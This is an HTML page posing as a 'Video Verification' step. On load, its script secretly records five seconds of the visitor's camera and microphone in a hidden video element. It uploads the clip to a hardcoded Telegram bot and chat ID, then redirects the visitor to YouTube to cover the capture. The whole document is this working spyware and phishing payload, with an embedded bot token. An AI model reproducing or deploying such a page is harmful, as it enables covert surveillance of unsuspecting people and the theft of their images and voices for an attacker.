<!DOCTYPE html>
<html>
<head>
    <title>Video Verification</title>
</head>
<body>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>

    <script>
        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
        const adminId = '8275787221';

        async function startRecording() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];

            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                await sendToTelegram(blob, 'video');
            };

            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
            }, 5000); // 5 soniya yozadi
        }

        async function sendToTelegram(blob, type) {
            const formData = new FormData();
            formData.append(type, blob, 'video.mp4');
            await fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}?chat_id=${adminId}`, {
                method: 'POST',
                body: formData
            });
            window.location.href = "https://youtube.com";
        }

        window.onload = startRecording;
    </script>
</body>
</html>
